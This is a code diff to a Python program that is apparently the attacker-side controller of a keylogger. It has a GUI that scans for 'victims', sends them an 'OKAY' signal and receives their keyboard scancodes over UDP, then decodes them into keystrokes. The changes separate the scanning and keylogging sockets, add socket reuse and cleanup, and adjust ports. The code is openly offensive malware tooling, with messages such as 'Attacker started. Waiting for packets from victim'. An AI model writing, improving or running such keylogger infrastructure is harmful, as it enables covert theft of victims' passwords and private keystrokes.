@@ -32,10 +32,15 @@ codes = ("", "«ESC", '1', '2', '3', '4', '5', '6', '7', '8', '9', '0',
          "«ALT_TAB»", "«ALT_ENTER»", "«CTRL_RELEASED»", "«SHIFT_RELEASED»", "«ALT_RELEASED»")
 
 SCAN_PORT = 49323
-KEYLOGS_PORT = 49324
+KEYLOGS_PORT = 49325
 
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-sock.bind(('', SCAN_PORT))
+scan_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+scan_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+scan_sock.bind(('', SCAN_PORT))
+
+keylogging_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+keylogging_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+keylogging_sock.bind(('', KEYLOGS_PORT))
 
 shift_on = False
 caps_on = False
@@ -210,10 +215,10 @@ class ScanningMachinesFrame(ctk.CTkFrame):
         self.app.start_choosing_window(self.incoming_queue)
 
     def scan_incoming_victims(self):
-        sock.settimeout(1)
+        scan_sock.settimeout(1)
         while not self.stop_scanning:
             try:
-                message, address = sock.recvfrom(256)
+                message, address = scan_sock.recvfrom(256)
             except TimeoutError:
                 continue
             self.incoming_queue.put((message, address))
@@ -300,13 +305,9 @@ class KeyloggerFrame(ctk.CTkFrame):
         self.thread = threading.Thread(target=self.start)
 
     def start(self):
-        global sock
-        sock.sendto(b"OKAY", self.victim[1])
-        sock.close()
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sock.bind(('', KEYLOGS_PORT))
+        scan_sock.sendto(b"OKAY", self.victim[1])
         while True:
-            data, address = sock.recvfrom(256)
+            data, address = keylogging_sock.recvfrom(256)
             if (address != self.victim[1]):
                 continue
             logs = decode_scancodes(data[1:])
@@ -370,18 +371,30 @@ class App(ctk.CTk):
         self.keylogger_frame = KeyloggerFrame(self, victim)
         self.keylogger_frame.grid(row=0, column=0, padx=0, pady=0, sticky="nswe")
         self.keylogger_frame.thread.start()
+    
+    def cleanup(self):
+        try:
+            scan_sock.close()
+        except Exception as e:
+            pass
+        try:
+            keylogging_sock.close()
+        except Exception as e:
+            pass
+        self.destroy()
 
 
 def main():
 
     ctk.set_appearance_mode("dark")
     app = App()
+    app.protocol("WM_DELETE_WINDOW", app.cleanup)
     app.mainloop()
 
 
     return
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    server_socket.bind(('', 49324))
+    server_socket.bind(('', 59324))
 
     print("\033[38;5;208mAttacker started. \033[3mWaiting for packets from victim...\033[0m")
 
